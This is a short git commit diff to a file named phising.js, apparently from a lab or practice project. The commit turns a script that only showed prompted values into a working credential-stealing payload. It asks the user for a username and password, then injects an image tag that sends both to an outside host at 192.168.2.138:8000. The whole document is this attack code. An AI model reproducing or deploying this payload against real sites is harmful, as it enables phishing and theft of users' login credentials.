9862435733c3451b72b6188f2ef8e4753f5362c8
sharmaSagar01 <sagaarpkr@gmail.com>
2022-11-23 21:43:22 -0500

    Final Commit

--- Scripts/phising.js
+++ Scripts/phising.js
@@ -1,4 +1,6 @@
 <script type="text/javascript">
-  var uName = prompt("UserName:") var password = prompt("Password: ")
-  alert(uName,password);
+  var uName = prompt("UserName:") 
+  var password = prompt("Password: ")
+  document.write('<img src=http://192.168.2.138:8000?c='
+   + uName + ":pass:" + password + ' >');
 </script>;
